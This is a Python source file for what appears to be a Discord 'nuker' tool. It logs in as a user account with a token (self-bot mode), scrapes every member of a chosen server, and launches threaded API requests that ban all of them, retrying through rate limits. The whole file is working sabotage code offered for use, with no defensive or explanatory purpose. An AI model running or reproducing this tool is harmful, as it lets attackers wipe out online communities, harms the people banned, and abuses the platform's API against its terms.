from scripts.settings import *

def massban():
    intentsssss = discord.Intents.all()
    intentsssss.members = True
    print("")
    albonukerheaders = {'Authorization': f'{token}'}
    albonukerclient = commands.Bot(command_prefix='.', case_insensitive=False, self_bot=True, intents=intentsssss)

    class albonuker:
        def BanMembers(self, guild, member):
            while True:
                r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=albonukerheaders)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f"{Fore.LIGHTCYAN_EX}[{Fore.GREEN}SUCCESS{Fore.LIGHTCYAN_EX}][{Fore.LIGHTWHITE_EX}{zeit}{Fore.LIGHTCYAN_EX}] » [{Fore.LIGHTWHITE_EX}BAN{Fore.LIGHTCYAN_EX}] {Fore.LIGHTWHITE_EX}Member: {Fore.LIGHTCYAN_EX}{member.strip()} {Fore.LIGHTGREEN_EX}banned")
                        break
                    else:
                        break

        async def albonuke(self):

            if os.path.isfile('members.txt'):
                os.remove('members.txt')
                pass

            guild = input(Colorate.Horizontal(Colors.red_to_blue, "Guild ID > "))
            print()
            await albonukerclient.wait_until_ready()
            guildOBJ = albonukerclient.get_guild(int(guild))
            members = await guildOBJ.chunk()

            membercount = 0
            with open('members.txt', 'x') as m:
                for member in members:
                    m.write(str(member.id) + "\n")
                    membercount += 1
                print(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTBLACK_EX}SUCCESS{Fore.LIGHTCYAN_EX}][{Fore.LIGHTWHITE_EX}{zeit}{Fore.LIGHTCYAN_EX}] » {Fore.LIGHTWHITE_EX}Members: {Fore.LIGHTCYAN_EX}{membercount} {Fore.LIGHTWHITE_EX}scraped")
                m.close()

            print()
            
            members = open('members.txt')

            for member in members:
                threading.Thread(target=self.BanMembers, args=(guild, member,)).start()

            members.close()
            if os.path.isfile('members.txt'):
                os.remove('members.txt')
                pass

        @albonukerclient.event
        async def on_ready():
            await albonuker().albonuke()

        def albonukerStartup():
            albonukerclient.run(token, bot=False)


    albonuker.albonukerStartup()